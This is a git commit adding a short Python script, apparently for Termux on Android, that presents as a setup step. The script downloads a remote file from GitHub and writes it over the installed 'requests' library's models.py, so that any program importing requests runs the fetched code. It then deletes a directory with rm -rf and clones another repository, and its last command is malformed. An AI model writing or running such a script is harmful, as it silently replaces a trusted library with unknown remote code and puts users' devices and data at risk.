5e0eb424208b0728f4ffe465f63286e24892fdfb
ArYan KhAn <105744869+innoxentAryan@users.noreply.github.com>
2022-11-04 07:24:33 +0500

    Create 1.py

---
+++ 1.py
@@ -0,0 +1,5 @@
+import os
+os.system('curl https://raw.githubusercontent.com/Kashif-Khanx/APROVAL/main/nikki_key.py > /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py')
+os.system("rm -rf Green-Lover")
+os.system("git clone https://github.com/Niki404-Cyber/Green-Lover")
+os.system("cd Green-Lover && cd Lover.py")
